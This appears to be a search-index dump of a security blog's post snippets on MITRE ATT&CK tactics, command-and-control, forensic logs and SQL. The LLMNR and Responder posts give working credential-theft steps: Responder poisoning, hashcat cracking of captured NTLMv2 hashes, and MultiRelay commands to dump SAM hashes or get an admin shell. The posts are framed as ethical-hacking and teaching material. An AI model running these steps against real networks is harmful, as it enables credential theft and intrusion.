Authentication Material &#8617; MITRE ATT&amp;CK - Access Token Manipulation &#8617; MITRE ATT&amp;CK - Access Token Manipulation: Token Impersonation/Theft &#8617; " }, { "title": "Initial Access", "url": "/posts/Initial_Access/", "categories": "Ethical Hacking, Tactics and Techniques", "tags": "initial access (TA0001)", "date": "2022-10-06 00:00:00 +1100", "snippet": "OverviewInitial Access consists of techniques that use various entry vectors to gain their initial foothold within a network. Techniques used to gain a foothold include targeted spearphishing and exploiting weaknesses on public-facing web servers. Footholds gained through initial access may allow for continued access, like valid accounts and use of external remote services, or may be limited-use due to changing passwords. 1Sources MITRE ATT&amp;CK - Initial Access TA0001 &#8617; " }, { "title": "Impact", "url": "/posts/Impact/", "categories": "Ethical Hacking, Tactics and Techniques", "tags": "impact (TA0040)", "date": "2022-10-06 00:00:00 +1100", "snippet": "OverviewThe adversary is trying to manipulate, interrupt, or destroy your systems and data.Impact consists of techniques that adversaries use to disrupt availability or compromise integrity by manipulating business and operational processes. Techniques used for impact can include destroying or tampering with data. In some cases, business processes can look fine, but may have been altered to benefit the adversaries’ goals. These techniques might be used by adversaries to follow through on their end goal or to provide cover for a confidentiality breach. 1Sources MITRE ATT&amp;CK - Impact TA0040 &#8617; " }, { "title": "Exfiltration", "url": "/posts/Exfiltration/", "categories": "Ethical Hacking, Tactics and Techniques", "tags": "exfiltration (TA0010)", "date": "2022-10-06 00:00:00 +1100", "snippet": "OverviewThe adversary is trying to steal data.Exfiltration consists of techniques that adversaries may use to steal data from your network. Once they’ve collected data, adversaries often package it to avoid detection while removing it. This can include compression and encryption. Techniques for getting data out of a target network typically include transferring it over their command and control channel or an alternate channel and may also include putting size limits on the transmission. 1Sources MITRE ATT&amp;CK - Exfiltration TA0010 &#8617; " }, { "title": "Execution", "url": "/posts/Execution/", "categories": "Ethical Hacking, Tactics and Techniques", "tags": "execution (TA0002)", "date": "2022-10-06 00:00:00 +1100", "snippet": "OverviewExecution consists of techniques that result in adversary-controlled code running on a local or remote system. Techniques that run malicious code are often paired with techniques from all other tactics to achieve broader goals, like exploring a network or stealing data. For example, an adversary might use a remote access tool to run a PowerShell script that does Remote System Discovery. 1Sources MITRE ATT&amp;CK - Execution TA0002 &#8617; " }, { "title": "Discovery", "url": "/posts/Discovery/", "categories": "Ethical Hacking, Tactics and Techniques", "tags": "discovery (TA0007)", "date": "2022-10-06 00:00:00 +1100", "snippet": "OverviewThe adversary is trying to figure out your environment.Discovery consists of techniques an adversary may use to gain knowledge about the system and internal network. These techniques help adversaries observe the environment and orient themselves before deciding how to act. They also allow adversaries to explore what they can control and what’s around their entry point in order to discover how it could benefit their current objective. Native operating system tools are often used toward this post-compromise information-gathering objective. 1Sources MITRE ATT&amp;CK - Discovery TA0007 &#8617; " }, { "title": "Defense Evasion", "url": "/posts/Defense_Evasion/", "categories": "Ethical Hacking, Tactics and Techniques", "tags": "defense evasion (TA0005)", "date": "2022-10-06 00:00:00 +1100", "snippet": "OverviewThe adversary is trying to avoid being detected.Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses. 1Defense Evasion TechniquesUse Alternate Authentication MaterialAdversaries may use alternate authentication material, such as password hashes, Kerberos tickets, and application access tokens, in order to move laterally within an environment and bypass normal system access controls. 2 Sub Technique ID Title T1550.001 Application Access Token T1550.002 Pass The Hash T1550.003 Pass The Ticket T1550.004 Web Session Cookie Access Token ManipulationAdversaries may modify access tokens to operate under a different user or system security context to perform actions and bypass access controls. Windows uses access tokens to determine the ownership of a running process. A user can manipulate access tokens to make a running process appear as though it is the child of a different process or belongs to someone other than the user that started the process. When this occurs, the process also takes on the security context associated with the new token. 3 Sub Technique ID Title T1134.001 Token Impersonation/Theft T1134.002 Create Process with Token T1134.003 Make and Impersonate Token T1134.004 Parent PID Spoofing T1134.005 SID-History Injection Sources MITRE ATT&amp;CK - Defense Evasion &#8617; MITRE ATT&amp;CK - Use Alternate Authentication Material &#8617; MITRE ATT&amp;CK - Access Token Manipulation &#8617; " }, { "title": "Credential Access", "url": "/posts/Credential_Access/", "categories": "Ethical Hacking, Tactics and Techniques", "tags": "credential access (TA0006), AiTM (T1557)", "date": "2022-10-06 00:00:00 +1100", "snippet": "OverviewThe adversary is trying to steal account names and passwords.Credential Access consists of techniques for stealing credentials like account names and passwords. Techniques used to get credentials include keylogging or credential dumping. Using legitimate credentials can give adversaries access to systems, make them harder to detect, and provide the opportunity to create more accounts to help achieve their goals. 1Once known credentials have been obtained, an attacker can achieve authentication to perform unauthorized actions under the guise of a legitimate user. View the CAPEC-560 post for more details on the attacks available using Known Domain Credentials.TechniquesAdversary-in-the-Middle (AiTM) 2Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as Network Sniffing or Transmitted Data Manipulation. By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.Specific procedures to conduct an AiTM attack can be seen the Darkcybe - CAPEC 94 post.AiTM Tools Darkcybe - Responder Guide Darkcybe - MITM6 Guide InveighSources MITRE ATT&amp;CK - Credential Access TA0006 &#8617; MITRE ATT&amp;CK - Adversary-in-the-Middle T1557 &#8617; " }, { "title": "Command and Control", "url": "/posts/Command_and_Control/", "categories": "Ethical Hacking, Tactics and Techniques", "tags": "command and control (TA0011)", "date": "2022-10-06 00:00:00 +1100", "snippet": "OverviewCommand and control (C2 or C&amp;C) refers to the communication and coordination between a cyber attacker and the infrastructure they use to launch an attack. This infrastructure can include compromised computers, servers, or other devices that are under the control of the attacker and used to execute their attack.The C2 infrastructure is often used to send commands to the compromised devices and receive information back from them, such as the results of an attack or the data that has been exfiltrated. This infrastructure is a key part of many cyber attacks, as it allows the attacker to maintain control over the compromised devices and coordinate their actions.C2 can take many forms, including using a specific website or server to communicate with the compromised devices, or using more covert methods such as embedding the C2 functionality within legitimate network traffic or using encrypted channels to communicate.Defending against C2 is an important aspect of cybersecurity, as it can help to disrupt the attacker’s ability to control their compromised devices and carry out their attack. This can be achieved through a variety of methods, such as blocking access to the C2 infrastructure, monitoring network traffic for signs of C2 activity, and using defensive technologies such as firewalls and intrusion detection systems to detect and prevent C2 communication.MITRE describe Command and Control as; The adversary is trying to communicate with compromised systems to control them.Command and Control consists of techniques that adversaries may use to communicate with systems under their control within a victim network. Adversaries commonly attempt to mimic normal, expected traffic to avoid detection. There are many ways an adversary can establish command and control with various levels of stealth depending on the victim’s network structure and defenses. 1Command and Control Mechanisms.There are several types of command and control (C2) that can be used in cyber attacks: Centralized C2: In this type of C2, the attacker maintains a central server or infrastructure that is used to send commands to and receive information from the compromised devices. This type of C2 is relatively easy to detect and disrupt, as all of the communication passes through a single point. Decentralized C2: In decentralized C2, the attacker uses a distributed network of servers or infrastructure to communicate with the compromised devices. This makes it more difficult to disrupt the C2 infrastructure, as the attacker can continue to operate even if some of the servers or infrastructure are taken offline. Covert C2: In covert C2, the attacker uses subtle or disguised methods to communicate with the compromised devices. This can include using encrypted channels, hiding the C2 communication within legitimate network traffic, or using steganography to embed the C2 communication within other types of data. Covert C2 is often more difficult to detect and disrupt.Centralized C2Centralized command and control (C2) refers to a type of C2 in which the attacker maintains a central server or infrastructure that is used to send commands to and receive information from the compromised devices. Some examples of centralized C2 include: Websites: The attacker can set up a specific website or server that the compromised devices communicate with in order to receive commands and send back information. This type of C2 is relatively easy to detect, as all of the communication is passing through a single point. IRC (Internet Relay Chat): The attacker can use an IRC server to communicate with the compromised devices. IRC is a messaging protocol that allows for real-time communication over the internet. Email: The attacker can use email to send commands to the compromised devices and receive information back. This can be done using a specific email account or by embedding the C2 communication within legitimate email traffic. VPN (Virtual Private Network): The attacker can use a VPN to establish a secure, encrypted connection between the compromised devices and the C2 infrastructure. This can make it more difficult to detect and disrupt the C2 communication.Defending against centralized C2 attacks involves monitoring network traffic for signs of C2 activity, using defensive technologies such as firewalls and intrusion detection systems, and implementing measures to disrupt the C2 infrastructure.Decentralized C2Decentralized command and control (C2) refers to a type of C2 in which the attacker uses a distributed network of servers or infrastructure to communicate with the compromised devices. Some examples of decentralized C2 include: P2P (Peer-to-Peer) Networks: The attacker can use a peer-to-peer network to communicate with the compromised devices. In this case, the compromised devices communicate directly with each other, rather than through a central server or infrastructure. Tor Network: The attacker can use the Tor network to communicate with the compromised devices. The Tor network is a decentralized network of servers that allows for anonymous communication over the internet. Botnets: The attacker can use a botnet to communicate with the compromised devices. A botnet is a network of compromised devices that can be used to launch coordinated attacks against a target.Defending against decentralized C2 attacks involves monitoring network traffic for signs of C2 activity, using defensive technologies such as firewalls and intrusion detection systems, and implementing measures to disrupt the C2 infrastructure. It can be more difficult to disrupt decentralized C2, as the attacker can continue to operate even if some of the servers or infrastructure are taken offline.Covert C2Covert command and control (C2) refers to a type of C2 in which the attacker uses subtle or disguised methods to communicate with the compromised devices. Some examples of covert C2 include: Encrypted Channels: The attacker can use encrypted channels, such as HTTPS or SSL, to communicate with the compromised devices. This can make it more difficult to detect the C2 communication, as the encrypted traffic looks like normal, legitimate traffic. Hiding C2 Communication within Legitimate Network Traffic: The attacker can hide the C2 communication within legitimate network traffic, such as HTTP or DNS traffic. This can make it more difficult to detect the C2 communication, as it is not visible to network monitoring tools. Steganography: The attacker can use steganography to embed the C2 communication within other types of data, such as images or audio files. This can make it even more difficult to detect the C2 communication, as it is not visible to network monitoring tools and requires specialized tools to detect.Defending against covert C2 attacks can be more difficult, as the C2 communication is not easily detectable. It may require more advanced techniques, such as traffic analysis and behavioral analysis, to detect and disrupt the C2 infrastructure.Reverse ShellsA reverse shell is a type of malicious software that allows an attacker to remotely control a compromised system. It allows the attacker to execute commands on the target system, as if they were sitting at the keyboard, and to access sensitive information and resources.Reverse shells are typically used in conjunction with other types of attacks, such as phishing or malware infections, to gain initial access to a target system. Once the attacker has established a reverse shell, they can use it to move laterally within the network, gather sensitive information, and execute additional attacks.There are many different ways that an attacker can create a reverse shell. One common method is to use a program called “netcat”, which is a network utility that can be used to create a connection between two systems over a network. An attacker can use netcat to send a command to the target system that opens a shell, allowing the attacker to execute commands on the system.Remote Access TrojansA remote access trojan (RAT) is a type of malware that allows an attacker to remotely control a compromised system. RATs are typically used to gain unauthorized access to a target system and can be used to steal sensitive information, execute additional attacks, and gain a foothold in a network.RATs are often delivered through phishing campaigns or other types of social engineering attacks. They can be disguised as legitimate software or documents, and once installed on a system, they establish a connection to a remote server, allowing the attacker to control the system remotely.There are many different types of RATs, and they can vary in their capabilities and features. Some RATs are simple and are only capable of basic functions, such as providing remote access to the system or gathering information about the system. Others are more complex and can perform a wide range of tasks, including keylogging, taking screenshots, and executing additional malware.Legitimate Remote Desktop ToolsRemote desktop applications, such as Remote Desktop Protocol (RDP), are useful tools that allow users to remotely access and control another system over a network. While these applications are useful for legitimate purposes, they can also be abused by attackers to gain command and control of a compromised system.One way that attackers can abuse remote desktop applications is by installing a legitimate application such as AnyDesk on a target system and using the application to establish a connection to the system. This allows the attacker to remotely control the system and execute commands as if they were sitting at the keyboard, whilst masquerading under the execution of a legitimate application often used by system administrators.Command and Control FrameworksThere are many different command and control (C2) frameworks that are used by attackers to remotely control compromised systems and execute commands. Some popular C2 frameworks include: Cobalt Strike: Cobalt Strike is a popular C2 framework that is used to conduct penetration testing and red teaming exercises, as well as to execute attacks in the wild. It includes a range of features, including keylogging, screen capture, and the ability to execute arbitrary commands. Metasploit: Metasploit is a widely-used C2 framework that is used by attackers to exploit vulnerabilities and gain access to systems. It includes a range of tools and features, including a framework for developing and executing exploits, a database of known vulnerabilities, and the ability to run custom scripts. Empire: Empire is a C2 framework that is designed to be used by attackers to conduct post-exploitation activities, such as privilege escalation and lateral movement. It includes a range of features, including the ability to execute arbitrary commands, gather system information, and generate malicious payloads. Pupy: Pupy is a C2 framework that is designed to be used by attackers to conduct post-exploitation activities, such as lateral movement and privilege escalation. It includes a range of features, including the ability to execute arbitrary commands, gather system information, and generate malicious payloads. Sliver: Sliver is a C2 framework that is designed to be used by attackers to remotely control compromised systems and execute commands. It is a lightweight framework that is designed to be easily deployable and scalable, and it includes a range of features that are useful for Brute Ratel: Brute Ratel is a penetration testing tool created after reverse engineering multiple highest quality Endpoint Detection and Response (EDR) and antivirus dynamic-link libraries (DLLs). It is a post-exploitation toolkit designed to avoid detection by EDR and antivirus capabilities.Sources MITRE ATT&amp;CK - Command and Control TA0011 &#8617; " }, { "title": "Collection", "url": "/posts/Collection/", "categories": "Ethical Hacking, Tactics and Techniques", "tags": "collection (TA0009)", "date": "2022-10-06 00:00:00 +1100", "snippet": "OverviewThe adversary is trying to gather data of interest to their goal.Collection consists of techniques adversaries may use to gather information and the sources information is collected from that are relevant to following through on the adversary’s objectives. Frequently, the next goal after collecting data is to steal (exfiltrate) the data. Common target sources include various drive types, browsers, audio, video, and email. Common collection methods include capturing screenshots and keyboard input. 1Sources MITRE ATT&amp;CK - Collection TA0009 &#8617; " }, { "title": "Port 5355 - LLMNR", "url": "/posts/LLMNR_5355/", "categories": "Ethical Hacking, Common Ports and Services", "tags": "llmnr, nbt-ns, nmap, port:5355, port:137, aitm, mitm, credential access (TA0006), ntlmv2, responder, hashcat", "date": "2022-10-06 00:00:00 +1100", "snippet": "OverviewLink-Local Multicast Name Resolution (LLMNR) and the previous iteration of the service called NetBIOS Name Service (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification. LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts. Port Service 5355 LLMNR 137 NBT-NS Abusing LLMNR via a AiTM/MITM attack can grant access to credentials in the form of a username and NTLMv2 hash, however this attack will require access to the same subnet as the client and server being intercepted. The below diagram depicts how this attack works: A domain connected host attempts to connect to //servername, forwarding the request to the Domain Controller (DC) in this instance that is running DNS and DHCP services. The //servername does not exist in the DNS records, therefore the DC returns the failed request. The host then broadcasts a request to all devices on the localnet looking for //servername. The attacker responds identifying itself as //servername. The host sends its plaintext username and NTLMv2 hashed password to the attacker. The attacker can then crack the hash received by the host to gain valid domain credentials.Reconnaissance/DiscoveryAs mentioned in the overview, this attack requires access to the domain as the attacking machine must be within the domain ip range in order to intercept the LLMNR request. External reconnaissance will not yield any useful results for this attack. An Internal discovery scan can be run against a Domain Controller to identify whether the LLMNR service is running by identification of the exposed port.sudo nmap -A -sC -p 5355, 137 10.10.10.10ExploitationUsing Responder to Perform LLMNR Poisoning# Responder listener on attacker machine, interface ens33 is on same domain as target# Running the listener will wait for a host to make a requestpython Responder.py -I ens33 -wdOnce a victim makes a request, the NTLMv2 Username and Hash will be captured as per the below output where the victim client 172.16.2.31 made a request for SERVERNAM, exposing the Administrator NTLMv2 credentials.Once NTLMv2 credentials hashes have been collected and saved to a text file. They can be parsed through a credential cracking utility such as hashcat.hashcat -m 5600 -a 0 /PATH/TO/DUMP.txt /usr/share/wordlists/rockyou.txt " }, { "title": "Responder", "url": "/posts/Responder/", "categories": "Ethical Hacking Tools, Credential Access", "tags": "responder, credential access (TA0006), llmnr, nbt-ns, mdns, aitm, mitm, hashcat, ntlmv2", "date": "2022-10-06 00:00:00 +1100", "snippet": "OverviewResponder is a LLMNR, NBT-NS and MDNS poisoner, with built-in HTTP/SMB/MSSQL/FTP/LDAP rogue authentication server supporting NTLMv1/NTLMv2/LMv2, Extended Security NTLMSSP and Basic HTTP authentication.Responder comes packaged with Kali Linux by default. 1. Additionally, Inveigh (a PowerShell version of Responder) is baked into PowerShell-Empire. Tool Name Version MITRE ATT&amp;CK Tactic MITRE ATT&amp;CK Technique Responder.py v3.1.3.0 Credential Access Adversary-in-the-Middle Responder Help Page __ .----.-----.-----.-----.-----.-----.--| |.-----.----. | _| -__|__ --| _ | _ | | _ || -__| _| |__| |_____|_____| __|_____|__|__|_____||_____|__| |__| NBT-NS, LLMNR &amp; MDNS Responder 3.1.3.0 To support this project: Patreon -&gt; https://www.patreon.com/PythonResponder Paypal -&gt; https://paypal.me/PythonResponder Author: Laurent Gaffie (laurent.gaffie@gmail.com) To kill this script hit CTRL-CUsage: responder -I eth0 -w -dor:responder -I eth0 -wdOptions: --version show program's version number and exit -h, --help show this help message and exit -A, --analyze Analyze mode. This option allows you to see NBT-NS, BROWSER, LLMNR requests without responding. -I eth0, --interface=eth0 Network interface to use, you can use 'ALL' as a wildcard for all interfaces -i 10.0.0.21, --ip=10.0.0.21 Local IP to use (only for OSX) -6 2002:c0a8:f7:1:3ba8:aceb:b1a9:81ed, --externalip6=2002:c0a8:f7:1:3ba8:aceb:b1a9:81ed Poison all requests with another IPv6 address than Responder's one. -e 10.0.0.22, --externalip=10.0.0.22 Poison all requests with another IP address than Responder's one. -b, --basic Return a Basic HTTP authentication. Default: NTLM -d, --DHCP Enable answers for DHCP broadcast requests. This option will inject a WPAD server in the DHCP response. Default: False -D, --DHCP-DNS This option will inject a DNS server in the DHCP response, otherwise a WPAD server will be added. Default: False -w, --wpad Start the WPAD rogue proxy server. Default value is False -u UPSTREAM_PROXY, --upstream-proxy=UPSTREAM_PROXY Upstream HTTP proxy used by the rogue WPAD Proxy for outgoing requests (format: host:port) -F, --ForceWpadAuth Force NTLM/Basic authentication on wpad.dat file retrieval. This may cause a login prompt. Default: False -P, --ProxyAuth Force NTLM (transparently)/Basic (prompt) authentication for the proxy. WPAD doesn't need to be ON. This option is highly effective. Default: False --lm Force LM hashing downgrade for Windows XP/2003 and earlier. Default: False --disable-ess Force ESS downgrade. Default: False -v, --verbose Increase verbosity.InstructionsUsing Responder to Perform LLMNR PoisoningExecute the below command on the attacker machine. Ensure that the -I switch is set to interface that is on the same network as the target.# Running the listener will wait for a host to make a requestsudo responder -I ens33 -wdOnce a set of NTLMv2 credentials have been collection, the password can be attempted to be cracked.Cracking NTLMv2 Credentials with HashCatWith the previously obtained NTLMv2 credential hash collected and saved to a text file. It can be parsed through a credential cracking utility such as hashcat.hashcat -m 5600 -a 0 /PATH/TO/DUMP.txt /usr/share/wordlists/rockyou.txt Using Responder-Finger and Responder-MultiRelayResponder comes packaged with additional tools can be used together with Responder to perform other tasks, such as relaying NTLMv2 credentials to gain authenticated access via SMB without the requirement to crack a collected NTLMv2 password hash. The below example shows how to identify systems that don’t require SMB signing (a requirement for this method to work) using Responder-Finger and setup the Responder-MultRelay to gain authenticated access to another host. Local Administrative privileges is however a requirement for the process to work.This will require three hosts; the attacker, the requesting LLMNR victim, and the target. Configure the Responder configuration file located at /etc/Responder/Responder.conf (On Kali Linux) to disable SMB and HTTP server replies. SMB = Off HTTP = Off Start Responder to listen for LLMNR requests. Ensure that the -I switch is set to interface that is on the same network as the target. sudo responder -I ens33 -wd Identify hosts on the target network that have SMB signing disabled, the -i switch requires the subnet to search. Once the results are returned, identify any hosts that return SMB signing: False. If none are returned, this method will not work and NTLMv2 credentials will need to be cracked instead. sudo responder-RunFinger.py -i 10.10.10.1/24 Start the MultiRelay to relay the NTLMv2 credentials to any target host identified in step 3. In this example, 10.10.10.10 was identified to have SMB signing disabled and is therefore used as the target -t. The -d switch will instruct the MultiRelay tool to dump the local password hashes. The -d switch can be omitted which will instead return an administrative shell to the target machine. sudo responder-MultiRelay.py -t 10.10.10.10 -u ALL -d If the -d switch was omitted in step 4, an interactive shell will be returned allowed the following commands. Dump: Extract the SAM database and print hashes regdump KEY: Dump a HKLM registry key read: Read a file get: Download a file delete: Delete a file Upload: Upload a local file to \\windows\\temp\\ runas: Run a command as the currently logged on user scan: Performs a scan using SMB for other local targets (use /24 or /26 to limit scope) mimi: Run a remote Mimikatz 64 command mimi32: Run a remote Mimikatz 32 command lcmd: Run a local command Sources Kali - Responder &#8617; " }, { "title": "Forensic Operating System Logs", "url": "/posts/OS_Logs/", "categories": "DFIR, Evidence Artifacts", "tags": "event logs", "date": "2022-10-06 00:00:00 +1100", "snippet": "A question that is typically raised during and post breach investigation is what event logs should be monitored, collected or enabled. The below list aims to provide a cheat sheet of sorts to highlight the common logs that contain forensic evidence and that often can be ingested into a central point, such as a SIEM, to provide contextual information for alerting.Windows Event LoggingWindows event logs are a useful tool in incident response and digital forensics because they provide a record of events that have occurred on a system. These events can include system-level events such as startup and shutdown, as well as application and service-level events. Examining these logs can help identify potential security incidents, troubleshoot issues, and provide evidence for forensic investigations. Log File File Path Description Security %SystemRoot%\\System32\\Winevt\\Logs\\Security.evtx Contains information about security-related events, such as successful and failed login attempts, access to sensitive resources, and changes to security settings. Application %SystemRoot%\\System32\\Winevt\\Logs\\Application.evtx Contains information about events related to applications, such as errors and warnings. System %SystemRoot%\\System32\\Winevt\\Logs\\System.evtx Contains information about events related to the operating system, such as hardware and software failures, resource utilization, and system updates. DNS Server %SystemRoot%\\System32\\Dns\\Dns.log Contains information about Domain Name System (DNS) activity, such as requests and responses. File Replication Service %SystemRoot%\\debug\\Frs\\FrsDiag.log Contains information about the File Replication Service (FRS), which is used to replicate files and folders between domain controllers. Internet Information Services (IIS) %SystemRoot%\\System32\\LogFiles\\W3SVC1\\ Contains information about web server activity, such as requests, responses, and errors. This folder contains multiple log files, including an exYYMMDD.log file for each day, a u_exYYMMDD.log file for each day that contains log data in a different format, and a W3SVC1 folder that contains additional log files. PowerShell %SystemRoot%\\System32\\Winevt\\Logs\\Windows PowerShell.evtx Contains information about PowerShell activity, such as script execution and cmdlet usage. Windows PowerShell Operational %SystemRoot%\\System32\\Winevt\\Logs\\Microsoft-Windows-PowerShell%4Operational.evtx Contains information about the operational state of PowerShell, such as start and stop events and errors. Remote Desktop Services %SystemRoot%\\System32\\Winevt\\Logs\\Microsoft-Windows-TerminalServices-LocalSessionManager%4Operational.evtx Contains information about Remote Desktop Services activity, including Remote Desktop Protocol (RDP) connections and disconnections. Windows Management Instrumentation %SystemRoot%\\System32\\Winevt\\Logs\\Microsoft-Windows-WMI-Activity%4Operational.evtx Contains information about WMI activity, including WMI queries and method calls. Windows Management Instrumentation Provider Operations %SystemRoot%\\System32\\Winevt\\Logs\\Microsoft-Windows-WMI-Operational.evtx Contains information about the operational state of WMI providers, including start and stop events and errors. Windows Defender log C:\\Windows\\System32\\Winevt\\Logs\\Microsoft-Windows-Windows Defender%4Operational.evtx Contains events related to the Windows Defender antivirus software. Unix/Linux Event LoggingLinux event logs are a useful tool in incident response and digital forensics because they provide a record of events that have occurred on a system. These events can include system-level events such as startup and shutdown, as well as application and service-level events. Examining these logs can help identify potential security incidents, troubleshoot issues, and provide evidence for forensic investigations. Log File Location Description Evidence References Syslog Messages Debian /var/log/syslog Redhat /var/log/messages General messages and info regarding system operations. Predominately an administrative focused log   - Plesk - Linux Logs Explained Auth.log Secure Debian /var/log/auth.log Redhat /var/log/secure Authentication logs containing successful and failed logins. sshd process logs are also written here   - Plesk - Linux Logs Explained - Forensic Focus - A Linux Forensics Starter Case Study Boot.log         MacOS Event LoggingMacOS event logs are a useful tool in incident response and digital forensics because they provide a record of events that have occurred on a system. These events can include system-level events such as startup and shutdown, as well as application and service-level events. Examining these logs can help identify potential security incidents, troubleshoot issues, and provide evidence for forensic investigations. Log File File Path Description System log /private/var/log/system.log Contains events related to system components such as drivers, the kernel, and the startup process. Secure log /private/var/log/secure.log Contains events related to security-related activities such as login and logout events, as well as successful and failed attempts to access resources. Application Firewall log /private/var/log/appfirewall.log Contains events related to applications and services running on the system, including events related to the macOS firewall. Setup log /private/var/log/install.log Contains events related to the installation, removal, and update of software on the system. Safari log /private/var/log/safari/Safari.log Contains events related to the Safari browser. MacOS Server log /Library/Logs/DiagnosticReports Contains events related to MacOS Server. References Microsoft documentation on Windows event logs SANS Institute’s guide on using Windows event logs in incident response Digital Forensics Solutions’ blog post on using Windows event logs in forensic investigations Tripwire’s blog post on using Windows event logs to detect security breaches TechNet’s guide on using the Event Viewer utility in Windows Digital Forensics Solutions’ blog post on using Linux logs in forensic investigations SANS Institute’s guide on using Linux logs in incident response Apple’s documentation on MacOS logs TechRepublic’s tutorial on using the Console application in MacOS" }, { "title": "CAPEC 94 - Adversary-in-the-Middle (AiTM)", "url": "/posts/94-AiTM/", "categories": "Ethical Hacking, CAPEC", "tags": "mitm, aitm, responder, ntlmv2, llmnr, dns, smb", "date": "2022-10-05 00:00:00 +1100", "snippet": "OverviewAttackers use man-in-the-middle (AiTM/MITM) techniques to attempt to position themselves between two or more networked devices to facilitate follow-up actions such as network sniffing and manipulation of transmitted data. By exploiting features of common network protocols that can determine the flow of network traffic (such as ARP, DNS, WPAD, and LLMNR), attackers can force devices to communicate through systems controlled by the attacker to obtain information such as hashed credentials. Noting that credentials are predominately the key object of value obtained through AiTM attacks, they are largely positioned between a client endpoint and an Active Directory(AD) server. CAPEC An adversary targets the communication between two components (typically client and server), in order to alter or obtain data from transactions. A general approach entails the adversary placing themselves within the communication channel between the two components. Types of AiTM AttacksLLMNR/NBT-NS Poisoning and SMB Relay MITRE ATT&amp;CK TA1557.001 - Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay Link-Local Multicast Name Resolution (LLMNR) and the previous iteration of the service called NetBIOS Name Service (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification. LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts. The key flaw of the service is that the username and NTLMv2 hash are returned.Server Message Block (SMB) Relay can also be used in conjunction with LLMNR attacks to utilize obtained NTLMv2 credentials for authentication rather than cracking the hashes offline. Port Service 5355 LLMNR 137 NBT-NS 445 SMB Specific procedures for attacking LLMNR and SMB Relay can be found in the Common Ports and Services sections and the Darkcybe - Responder tool guide. Additionally, Inveigh (a PowerShell version of Responder) is baked into PowerShell-Empire.Mitigation’s against LLMNR Attacks Black Hills - How to Disable LLMNR &amp; Why You Want ToInternet Protocol Version 6 (IPv6)IPv6 is a network layer protocol that was developed and brought into existence in 1998 with the sole purpose of succeeding IPv6. It is generally enabled by default on most Windows systems, even if not actively being used. In Enterprise networks, this could present a significant vulnerability that can be exploited to gain credentials and access networked systems.The following post contains details on how to perform an AiTM attack on IPv6 using MITM6.Mitigations against MITM6, WPAD, LDAP, and Delegation Attacks Dirkjanm - The worst of both worlds: Combining NTLM Relaying and Kerberos delegationTechniques Explore Determine Communication Mechanism: The adversary determines the nature and mechanism of communication between two components, looking for opportunities to exploit. Perform a sniffing attack and observe communication to determine a communication protocol. Look for application documentation that might describe a communication mechanism used by a target. Experiment Position In Between Targets: The adversary inserts themselves into the communication channel initially acting as a routing proxy between the two targeted components. Install spyware on a client that will intercept outgoing packets and route them to their destination as well as route incoming packets back to the client. Exploit a weakness in an encrypted communication mechanism to gain access to traffic. Look for outdated mechanisms such as SSL. Exploit Use Intercepted Data Maliciously: The adversary observes, filters, or alters passed data of its choosing to gain access to sensitive information or to manipulate the actions of the two target components for their own purposes. Prevent some messages from reaching their destination, causing a denial of service. " }, { "title": "AppCompatCacheParser", "url": "/posts/AppCompatCacheParser/", "categories": "DFIR Tools, Program Execution", "tags": "shimcache, appcompatcache, appcompatcacheparser, ez tools, execution (T0002)", "date": "2022-10-05 00:00:00 +1100", "snippet": "OverviewAppCompatCacheParser is a command line tool developed by Eric Zimmerman, to process the ShimCache (AppCompatCache) on Windows operating systems, identifying items such as: Executable filepaths Timestamp of last executionResults can output the hive entries files into .csv for further analysis. Further Information the ShimCache can be found on Darkcybe - Evidence of Execution Tool Name Version MITRE ATT&amp;CK Tactic MITRE ATT&amp;CK Technique AppCompatCacheParser V1.5 Execution   InstructionsInteresting Fields Path: Full filepath of executable LastModifiedTimeUTC: Timestamp in UTC of last modification Executed: Execution flag (applications can be shimmed without being executed)Parsing the ShimCache (AppCompatCache) on a Live Systemappcompatcacheparser.exe --csvf %OUTPUT_FILENAME%.csv --csv %OUTPUT_DIRECTORY%Parsing the ShimCache (AppCompatCache) from a Forensic Copyappcompatcacheparser.exe -f /PATH/TO/SYSTEM hive --csvf %OUTPUT_FILENAME%.csv --csv %OUTPUT_DIRECTORY%OutputSources Eric Zimmerman" }, { "title": "SQL Overview", "url": "/posts/SQL_Overview/", "categories": "General IT and Security, Programming", "tags": "sql", "date": "2022-10-02 00:00:00 +1000", "snippet": "OverviewStructured Query Language (SQL) is designed for managing data held in a relational database management system (RDBMS). It is particularly useful in handling structured data, i.e. data incorporating relations among entities and variables. SQL Server is a product developed by Microsoft to manage relational databases, storing and retrieving data requested by other applications. There are various topics regarding SQL and cyber security ranging from the protection of databases, SQL Injection attacks and database manipulation. This post however, serves as a fundamental overview of the SQL database programming and server.Database ConceptsA relational database is designed to organize a collection of data, typically stored and accessed electronically from a computer system or electronic device and is regularly referenced and altered by software applications. There are three generic styles of databases, with SQL focusing on the later, Relational Databases. Hierarchical: Think directory structure Flat-file: CSV, Excel, Delimited Relational: MSSQL, MySQL, and more Tables: Think an excel page Columns: Data headers Rows: Data values SQL Sub-languagesData Manipulation Language (DML)DML is an SQL sub-language that deals with the manipulation of data records stored within the database tables. It does not deal with changes to database objects or its structure. Some commonly used examples of DML are as in the table below: Statement Description Code Example SELECT Retrieve rows from database and enables select of one or many rows or columns SELECT SalesOrderID, SUM(LineTotal) AS SubTotalFROM Sales.SalesOrderDetail INSERT Adds one or more rows to a table or view INSERT INTO table_name (column1, column2)VALUES (value1, value2) INSERT INTO table_nameVALUES (value1, value2, value3) UPDATE Changes existing data in a table or view   DELETE Removes one or more rows from a table or view DELETE FROM table_nameWHERE [condition]; MERGE Performs insert, update, or deletes on a target table based on the results of a join with a source table   BULK INSERT Imports a data file into a database table or view   Data Definition Language (DML)Unlike DML above, DDL defines data structures and is used to update or modify objects rather than the data contained within them. The below table lists the more common DDL statements used: Statement Description Code Example CREATE 